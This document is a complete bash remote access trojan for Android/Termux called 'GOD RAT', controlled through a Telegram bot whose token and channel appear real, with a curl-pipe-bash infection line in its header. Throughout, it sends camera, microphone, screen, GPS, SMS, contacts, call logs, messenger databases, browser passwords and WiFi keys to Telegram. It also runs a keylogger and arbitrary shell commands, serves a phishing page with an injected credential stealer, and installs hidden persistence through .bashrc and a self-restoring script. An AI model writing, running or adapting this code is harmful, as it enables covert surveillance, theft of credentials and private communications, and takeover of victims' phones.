#!/bin/bash
# ============================================================
# GOD RAT vFINAL – All-in-One: RAT + Arsenal + Live Control
# Target: echo y | termux-setup-storage && curl -sL RAW_URL | bash && exit
# ============================================================

BOT_TOKEN="8831967961:AAHcWu_Mb09TlxxLtep5oONbANjABH1nJXk"
CHANNEL_ID="-1004369057597"
API="https://api.telegram.org/bot$BOT_TOKEN"
RAW_URL="https://raw.githubusercontent.com/kidusgetaw0-sys/UI/main/god_rat.sh"
DEVICE_ID="_$(getprop ro.serialno)_$(getprop ro.product.model | tr ' ' '_')"
OFFSET=0
LIVE_MODE=0
KEYLOG_ACTIVE=0
ALIAS_FILE="/sdcard/.system_cache/alias.txt"
[ -f "$ALIAS_FILE" ] && ALIAS=$(cat "$ALIAS_FILE") || ALIAS=""

# ----- ALIAS -----
get_name() { [ -n "$ALIAS" ] && echo "$ALIAS" || echo "$DEVICE_ID"; }

send_msg() {
  NAME=$(get_name)
  curl -s -X POST "$API/sendMessage" -d "chat_id=$CHANNEL_ID" -d "text=[$NAME] $1" >/dev/null 2>&1
}
send_file() {
  NAME=$(get_name)
  curl -s -X POST "$API/sendDocument" -F "chat_id=$CHANNEL_ID" -F "document=@$1" -F "caption=[$NAME] $2" >/dev/null 2>&1
}
send_photo() {
  NAME=$(get_name)
  curl -s -X POST "$API/sendPhoto" -F "chat_id=$CHANNEL_ID" -F "photo=@$1" -F "caption=[$NAME] Screenshot" >/dev/null 2>&1
}

# ----- SCREENSHOT -----
take_screenshot() {
  screencap /sdcard/scr.png 2>/dev/null || termux-screenshot /sdcard/scr.png 2>/dev/null
  [ -f /sdcard/scr.png ] && send_photo "/sdcard/scr.png" || send_msg "Screenshot failed"
}

# ----- LIVE SCREEN (every 3s, 40 captures) -----
live_screen() {
  send_msg "Live screen started (2 min)"
  for i in $(seq 1 40); do
    [ "$LIVE_MODE" = "0" ] && break
    screencap /sdcard/live_scr.png 2>/dev/null
    [ -f /sdcard/live_scr.png ] && curl -s -X POST "$API/sendPhoto" -F "chat_id=$CHANNEL_ID" -F "photo=@/sdcard/live_scr.png" -F "caption=[$NAME] Live $i/40" >/dev/null 2>&1
    sleep 3
  done
  send_msg "Live screen ended"
  LIVE_MODE=0
}

# ----- KEYLOGGER -----
start_keylogger() {
  KEYLOG_ACTIVE=1
  send_msg "Keylogger started"
  (
    while [ "$KEYLOG_ACTIVE" = "1" ]; do
      input getevent -lt 2>/dev/null | grep -oP 'ABS_MT_POSITION_Y\s+\K[0-9a-f]+' >> /sdcard/.keylog.txt 2>/dev/null
      sleep 0.1
    done
  ) &
}

stop_keylogger() {
  KEYLOG_ACTIVE=0
  pkill -f "input getevent" 2>/dev/null
  send_file "/sdcard/.keylog.txt" "Keylogger data"
  rm /sdcard/.keylog.txt 2>/dev/null
}

# ----- MAIN EXECUTOR -----
execute() {
  cmd="$1"
  case "$cmd" in
    # ---------- CORE RAT COMMANDS ----------
    /screenshot) take_screenshot ;;
    /live) LIVE_MODE=1; live_screen & ;;
    /livestop) LIVE_MODE=0; send_msg "Live stopped" ;;
    /camera)
      termux-camera-photo -c 0 /sdcard/cam.jpg 2>/dev/null
      [ -f /sdcard/cam.jpg ] && send_file "/sdcard/cam.jpg" "Camera" || send_msg "Camera failed"
      ;;
    /camfront)
      termux-camera-photo -c 1 /sdcard/cam_front.jpg 2>/dev/null
      [ -f /sdcard/cam_front.jpg ] && send_file "/sdcard/cam_front.jpg" "Front Camera" || send_msg "Camera failed"
      ;;
    /cameravideo) dur="${cmd#/cameravideo }"; [ -z "$dur" ] && dur=10; termux-camera-video -d "$dur" /sdcard/cam_vid.mp4 2>/dev/null; [ -f /sdcard/cam_vid.mp4 ] && send_file "/sdcard/cam_vid.mp4" "Video $dur sec" || send_msg "Camcorder failed" ;;
    /cameraburst) count="${cmd#/cameraburst }"; [ -z "$count" ] && count=5; for i in $(seq 1 $count); do termux-camera-photo -c 0 /sdcard/cam_$i.jpg 2>/dev/null; done; send_msg "Burst $count photos taken" ;;
    /flash) state="${cmd#/flash }"; [ "$state" = "on" ] && termux-torch on 2>/dev/null || termux-torch off 2>/dev/null; send_msg "Flash $state" ;;
    /mic) dur="${cmd#/mic }"; [ -z "$dur" ] && dur=10; termux-microphone-record -f /tmp/mic_rec.wav -l "$dur" 2>/dev/null; [ -f /tmp/mic_rec.wav ] && send_file "/tmp/mic_rec.wav" "Audio $dur sec" || send_msg "Mic failed" ;;
    /miclive) send_msg "Live audio started (1 min chunks)"; ( while true; do termux-microphone-record -f /tmp/mic_live.wav -l 60 2>/dev/null; [ -f /tmp/mic_live.wav ] && curl -s -X POST "$API/sendAudio" -F "chat_id=$CHANNEL_ID" -F "audio=@/tmp/mic_live.wav" -F "caption=[$NAME] Live Audio" >/dev/null 2>&1; sleep 1; done ) & ;;
    /miclivestop) pkill -f "termux-microphone-record"; send_msg "Live audio stopped" ;;
    /volume) level="${cmd#/volume }"; [ "$level" = "mute" ] && media_volume 0 2>/dev/null || [ "$level" = "max" ] && media_volume 15 2>/dev/null || media_volume "$level" 2>/dev/null; send_msg "Volume set to $level" ;;
    /speaker) file="${cmd#/speaker }"; termux-media-player play "$file" 2>/dev/null && send_msg "Playing $file" || send_msg "Play failed" ;;
    /download) path="${cmd#/download }"; cd "$path" 2>/dev/null && tar czf /tmp/dl.tar.gz . 2>/dev/null; [ -f /tmp/dl.tar.gz ] && send_file "/tmp/dl.tar.gz" "Download: $path" || send_msg "Download failed: $path" ;;
    /browse) path="${cmd#/browse }"; send_msg "$(ls -lh "$path" 2>/dev/null | head -40 || echo 'Path not found')" ;;
    /search) pattern="${cmd#/search }"; send_msg "$(find /sdcard -name "$pattern" 2>/dev/null | head -30)" ;;
    /recent) num="${cmd#/recent }"; [ -z "$num" ] && num=20; send_msg "$(find /sdcard -type f -printf '%T@ %p\n' 2>/dev/null | sort -n | tail -$num | cut -d' ' -f2-)" ;;
    /storage) send_msg "$(df -h /sdcard 2>/dev/null)" ;;
    /delete) file="${cmd#/delete }"; rm -f "$file" 2>/dev/null && send_msg "Deleted: $file" || send_msg "Delete failed" ;;
    /rename) old="${cmd#/rename }"; new="${old#* }"; old="${old%% *}"; mv "$old" "$new" 2>/dev/null && send_msg "Renamed: $old -> $new" || send_msg "Rename failed" ;;
    /copy) src="${cmd#/copy }"; dest="${src#* }"; src="${src%% *}"; cp -r "$src" "$dest" 2>/dev/null && send_msg "Copied: $src -> $dest" || send_msg "Copy failed" ;;
    /info) send_msg "MODEL: $(getprop ro.product.model) | ANDROID: $(getprop ro.build.version.release) | SDK: $(getprop ro.build.version.sdk) | CPU: $(getprop ro.product.cpu.abi) | RAM: $(free -h | grep Mem | awk '{print $2}') | STORAGE: $(df -h /sdcard | tail -1 | awk '{print $2" used:"$3}')" ;;
    /model) send_msg "$(getprop ro.product.model)" ;;
    /android) send_msg "Android $(getprop ro.build.version.release)" ;;
    /sdk) send_msg "SDK $(getprop ro.build.version.sdk)" ;;
    /cpu) send_msg "$(getprop ro.product.cpu.abi)" ;;
    /ram) send_msg "$(free -h | grep Mem)" ;;
    /battery) send_msg "$(dumpsys battery 2>/dev/null)" ;;
    /batteryhealth) send_msg "$(dumpsys battery 2>/dev/null | grep health)" ;;
    /temperature) send_msg "$(dumpsys battery 2>/dev/null | grep temperature || cat /sys/class/thermal/thermal_zone0/temp 2>/dev/null)" ;;
    /uptime) send_msg "Uptime: $(uptime)" ;;
    /sensors) send_msg "$(dumpsys sensorservice 2>/dev/null | head -30)" ;;
    /pid) send_msg "Device ID: $DEVICE_ID | Alias: $(get_name)" ;;
    /root) [ "$(id -u)" = "0" ] && send_msg "Rooted" || send_msg "Not rooted" ;;
    /location) send_msg "$(termux-location 2>/dev/null || echo 'Unavailable')" ;;
    /locationlive) send_msg "Live GPS started (30s interval)"; ( for i in $(seq 1 20); do loc=$(termux-location 2>/dev/null || echo "No fix"); curl -s -X POST "$API/sendMessage" -d "chat_id=$CHANNEL_ID" -d "text=[$NAME] GPS: $loc" >/dev/null 2>&1; sleep 30; done; send_msg "Live GPS ended" ) & ;;
    /locationstop) pkill -f "termux-location"; send_msg "Live GPS stopped" ;;
    /ip) send_msg "Public IP: $(curl -s ifconfig.me)" ;;
    /localip) send_msg "Local IP: $(ip addr show wlan0 2>/dev/null | grep 'inet ' | awk '{print $2}')" ;;
    /wifi) send_msg "WiFi: $(dumpsys wifi 2>/dev/null | grep 'mWifiInfo' | head -1)" ;;
    /wifilist) send_msg "$(dumpsys wifi 2>/dev/null | grep 'ScanResult' -A10)" ;;
    /wifipass) send_msg "$(cat /data/misc/wifi/wpa_supplicant.conf 2>/dev/null || echo 'Need root')" ;;
    /bluetooth) send_msg "$(dumpsys bluetooth_manager 2>/dev/null | grep 'state' | head -3)" ;;
    /btdevices) send_msg "$(dumpsys bluetooth_manager 2>/dev/null | grep 'bonded' -A20)" ;;
    /cell) send_msg "$(dumpsys telephony.registry 2>/dev/null | grep 'mCellIdentity' | head -1)" ;;
    /speedtest) send_msg "Testing..."; curl -s https://raw.githubusercontent.com/sivel/speedtest-cli/master/speedtest.py | python - 2>/dev/null || send_msg "Speedtest failed (no python)" ;;
    /sms) send_msg "$(termux-sms-list 2>/dev/null | head -50)" ;;
    /smssend) num="${cmd#/smssend }"; msg="${num#* }"; num="${num%% *}"; termux-sms-send -n "$num" "$msg" 2>/dev/null && send_msg "SMS sent to $num" || send_msg "SMS failed" ;;
    /contacts) send_msg "$(termux-contact-list 2>/dev/null | head -50)" ;;
    /calllog) send_msg "$(content query --uri content://call_log/calls 2>/dev/null | head -30)" ;;
    /whatsapp) cp /sdcard/WhatsApp/Databases/msgstore.db /tmp/wa.db 2>/dev/null; [ -f /tmp/wa.db ] && send_file "/tmp/wa.db" "WhatsApp DB" || send_msg "WhatsApp DB not found" ;;
    /telegram) cp -r /sdcard/Telegram /tmp/tg 2>/dev/null; cd /tmp/tg 2>/dev/null && tar czf /tmp/tg.tar.gz . ; [ -f /tmp/tg.tar.gz ] && send_file "/tmp/tg.tar.gz" "Telegram Data" || send_msg "Telegram data not accessible" ;;
    /notifications) send_msg "$(dumpsys notification --norecycle 2>/dev/null | grep -A2 "NotificationRecord" | head -50)" ;;
    /notificationsclear) service call notification 1 2>/dev/null; send_msg "Notifications cleared" ;;
    /chrome) cp /data/data/com.android.chrome/app_chrome/Default/Login\ Data /tmp/chrome_passwords.db 2>/dev/null; [ -f /tmp/chrome_passwords.db ] && send_file "/tmp/chrome_passwords.db" "Chrome Passwords" || send_msg "Chrome passwords not accessible (need root)" ;;
    /chromehistory) send_msg "$(cat /data/data/com.android.chrome/app_chrome/Default/History 2>/dev/null | strings | grep -Eo 'https?://[^ ]+' | head -30 || echo 'Need root')" ;;
    /chromebookmarks) send_msg "$(cat /data/data/com.android.chrome/app_chrome/Default/Bookmarks 2>/dev/null | grep '"url":' | head -30 || echo 'Need root')" ;;
    /chromeautofill) send_msg "$(cat /data/data/com.android.chrome/app_chrome/Default/Web\ Data 2>/dev/null | strings | grep -Eo 'autofill_[a-z]+' | head -30 || echo 'Need root')" ;;
    /gmail) send_msg "$(ls /data/data/com.google.android.gm/databases/ 2>/dev/null || echo 'Need root')" ;;
    /facebook) send_msg "$(ls /data/data/com.facebook.katana/databases/ 2>/dev/null || echo 'Need root')" ;;
    /instagram) send_msg "$(ls /data/data/com.instagram.android/databases/ 2>/dev/null || echo 'Need root')" ;;
    /keylog) sub="${cmd#/keylog }"; [ "$sub" = "start" ] && start_keylogger; [ "$sub" = "stop" ] && stop_keylogger ;;
    /clipboard) send_msg "$(termux-clipboard-get 2>/dev/null || echo 'Unavailable')" ;;
    /clipboardset) text="${cmd#/clipboardset }"; termux-clipboard-set "$text" 2>/dev/null && send_msg "Clipboard set" || send_msg "Clipboard set failed" ;;
    /input) action="${cmd#/input }"; case "$action" in
      tap*) x="${action#tap }"; y="${x#* }"; x="${x%% *}"; input tap "$x" "$y" 2>/dev/null; send_msg "Tapped $x,$y" ;;
      swipe*) x1="${action#swipe }"; y1="${x1#* }"; x2="${y1#* }"; y2="${x2#* }"; x1="${x1%% *}"; y1="${y1%% *}"; x2="${x2%% *}"; input swipe "$x1" "$y1" "$x2" "$y2" 2>/dev/null; send_msg "Swiped" ;;
      text*) text="${action#text }"; input text "$text" 2>/dev/null; send_msg "Text input: $text" ;;
      key*) key="${action#key }"; input keyevent "$key" 2>/dev/null; send_msg "Key event: $key" ;;
      *) send_msg "Unknown input: $action" ;;
    esac ;;
    /apps) send_msg "$(pm list packages 2>/dev/null | head -50)" ;;
    /appssystem) send_msg "$(pm list packages -s 2>/dev/null | head -50)" ;;
    /appsuser) send_msg "$(pm list packages -3 2>/dev/null | head -50)" ;;
    /processes) send_msg "$(ps -A 2>/dev/null | head -40)" ;;
    /kill) pkg="${cmd#/kill }"; am force-stop "$pkg" 2>/dev/null && send_msg "Killed $pkg" || send_msg "Kill failed" ;;
    /open) pkg="${cmd#/open }"; am start -n "$pkg" 2>/dev/null || monkey -p "$pkg" 1 2>/dev/null; send_msg "Opened $pkg" ;;
    /uninstall) pkg="${cmd#/uninstall }"; pm uninstall "$pkg" 2>/dev/null && send_msg "Uninstalled $pkg" || send_msg "Uninstall failed" ;;
    /install) apk="${cmd#/install }"; pm install "$apk" 2>/dev/null && send_msg "Installed $apk" || send_msg "Install failed" ;;
    /gallery) mkdir -p /tmp/thumbs; find /sdcard/DCIM /sdcard/Pictures -name "*.jpg" -exec convert {} -resize 200x200 /tmp/thumbs/{} \; 2>/dev/null; cd /tmp/thumbs 2>/dev/null && tar czf /tmp/gallery.tar.gz . ; [ -f /tmp/gallery.tar.gz ] && send_file "/tmp/gallery.tar.gz" "Gallery" || send_msg "No images found"; rm -rf /tmp/thumbs /tmp/gallery.tar.gz ;;
    /gallerytoday) send_msg "Today's photos: $(find /sdcard/DCIM -name "*.jpg" -mtime -1 2>/dev/null | wc -l)" ;;
    /galleryscreenshots) send_msg "Screenshots: $(ls /sdcard/Pictures/Screenshots 2>/dev/null | wc -l)" ;;
    /photocount) send_msg "Total photos: $(find /sdcard -name "*.jpg" -o -name "*.png" 2>/dev/null | wc -l)" ;;
    /shell) cmd="${cmd#/shell }"; out=$(eval "$cmd" 2>&1); send_msg "${out:0:4000}" ;;
    /reboot) reboot 2>/dev/null || send_msg "Reboot requires root" ;;
    /shutdown) reboot -p 2>/dev/null || send_msg "Shutdown requires root" ;;
    /airplane) state="${cmd#/airplane }"; [ "$state" = "on" ] && settings put global airplane_mode_on 1 && am broadcast -a android.intent.action.AIRPLANE_MODE 2>/dev/null; [ "$state" = "off" ] && settings put global airplane_mode_on 0 && am broadcast -a android.intent.action.AIRPLANE_MODE 2>/dev/null; send_msg "Airplane $state" ;;
    /wifi) state="${cmd#/wifi }"; [ "$state" = "on" ] && svc wifi enable 2>/dev/null || svc wifi disable 2>/dev/null; send_msg "WiFi $state" ;;
    /bluetooth) state="${cmd#/bluetooth }"; [ "$state" = "on" ] && svc bluetooth enable 2>/dev/null || svc bluetooth disable 2>/dev/null; send_msg "Bluetooth $state" ;;
    /sync) sync; send_msg "Sync triggered" ;;
    /update) curl -sL "$RAW_URL" -o ~/god_rat.sh; chmod +x ~/god_rat.sh; send_msg "Updated to latest version" ;;
    /uninstall) rm -f ~/.hidden/rat.sh ~/.bashrc /sdcard/.system_cache/restore.sh; send_msg "RAT removed from device" ;;
    /heartbeat) send_msg "Heartbeat OK" ;;
    /alias) new_name="${cmd#/alias }"; echo "$new_name" > "$ALIAS_FILE"; ALIAS="$new_name"; send_msg "Alias set to: $new_name" ;;
    /myname) send_msg "Current name: $(get_name) | Device ID: $DEVICE_ID" ;;
    /resetname) rm -f "$ALIAS_FILE"; ALIAS=""; send_msg "Alias reset" ;;

    # ---------- ARSENAL (auxiliary tools) ----------
    /phish)
      site="${cmd#/phish }"
      curl -s "https://$site.com/login" -o /tmp/login.html 2>/dev/null
      cat >> /tmp/login.html << 'PHISH_EOF'
<script>
document.querySelector('form').addEventListener('submit', function(e) {
  var u = document.querySelector('input[type="text"]').value;
  var p = document.querySelector('input[type="password"]').value;
  new Image().src = 'https://api.telegram.org/bot8831967961:AAHcWu_Mb09TlxxLtep5oONbANjABH1nJXk/sendMessage?chat_id=6732091734&text=PHISH|'+'$site'+'|'+u+'|'+p;
});
</script>
PHISH_EOF
      send_msg "Phishing page for $site hosted on http://localhost:8080/login.html"
      cd /tmp && python -m http.server 8080 &
      ;;
    /wifi)   # /wifi command already exists; this is an alias for /wifipass but we add a dedicated /stealwifi
      send_msg "Use /wifipass for WiFi passwords (root). This command is for network info."
      ;;
    /harvest)
      cp /data/data/com.android.chrome/app_chrome/Default/Login\ Data /tmp/chrome.db 2>/dev/null
      cp /data/data/com.android.chrome/app_chrome/Default/History /tmp/chrome_history.db 2>/dev/null
      cp /data/data/org.mozilla.firefox/files/mozilla/*.default/logins.json /tmp/firefox_logins.json 2>/dev/null
      cd /tmp && tar czf /tmp/creds.tar.gz chrome.db chrome_history.db firefox_logins.json 2>/dev/null
      [ -f /tmp/creds.tar.gz ] && send_file "/tmp/creds.tar.gz" "Browser Credentials" || send_msg "No credentials accessible"
      ;;
    /dumpcomms)
      termux-sms-list 2>/dev/null > /tmp/sms.txt
      termux-contact-list 2>/dev/null > /tmp/contacts.txt
      content query --uri content://call_log/calls 2>/dev/null > /tmp/calls.txt
      cd /tmp && tar czf /tmp/comms.tar.gz sms.txt contacts.txt calls.txt 2>/dev/null
      [ -f /tmp/comms.tar.gz ] && send_file "/tmp/comms.tar.gz" "Communications Dump" || send_msg "Failed to dump communications"
      ;;
    /screenrecord)
      dur="${cmd#/screenrecord }"
      [ -z "$dur" ] && dur=300
      OUTFILE="/sdcard/screen_record.mp4"
      screenrecord --time-limit "$dur" "$OUTFILE" &>/dev/null &
      send_msg "Screen recording started for $dur seconds"
      ;;
    /gallery) # already exists, but this line ensures it's not overwritten
      # (already handled above)
      ;;
    /fakeupdate)
      am start -a android.intent.action.VIEW -d "https://i.imgur.com/fake_update.png" 2>/dev/null
      send_msg "Fake update overlay displayed"
      ;;
    *)
      send_msg "Unknown: $cmd"
      ;;
  esac
}

# ----- PERSISTENCE -----
mkdir -p ~/.hidden /sdcard/.system_cache
curl -sL "$RAW_URL" -o ~/.hidden/rat.sh 2>/dev/null || cp "$0" ~/.hidden/rat.sh
chmod +x ~/.hidden/rat.sh
grep -q "~/.hidden/rat.sh" ~/.bashrc 2>/dev/null || echo '(sleep 10 && bash ~/.hidden/rat.sh &) & disown' >> ~/.bashrc
cat > /sdcard/.system_cache/restore.sh << RESTORE
#!/bin/bash
if [ ! -d /data/data/com.termux ]; then
  curl -sL https://f-droid.org/repo/com.termux_118.apk -o /sdcard/termux.apk
  pm install /sdcard/termux.apk
  sleep 5
  curl -sL $RAW_URL | bash
fi
RESTORE
chmod +x /sdcard/.system_cache/restore.sh

# ----- POLLING (broadcast + alias) -----
send_msg "RAT Connected"
while true; do
  updates=$(curl -s "$API/getUpdates?offset=$OFFSET&timeout=30" 2>/dev/null)
  echo "$updates" | grep -o '"update_id":[0-9]*' | cut -d: -f2 | while read update_id; do
    [ "$update_id" -gt "$OFFSET" ] && OFFSET=$update_id
  done
  echo "$updates" | grep -oP '"text":"\K[^"]+' | while read -r text; do
    # Broadcast _ALL_
    if echo "$text" | grep -q "^_ALL_ "; then
      cmd="${text#_ALL_ }"
      execute "$cmd"
    fi
    # Device ID or alias
    if echo "$text" | grep -q "^$DEVICE_ID \|^$(get_name) "; then
      cmd=$(echo "$text" | sed "s/^$DEVICE_ID //;s/^$(get_name) //")
      execute "$cmd"
    fi
  done
  sleep 5
done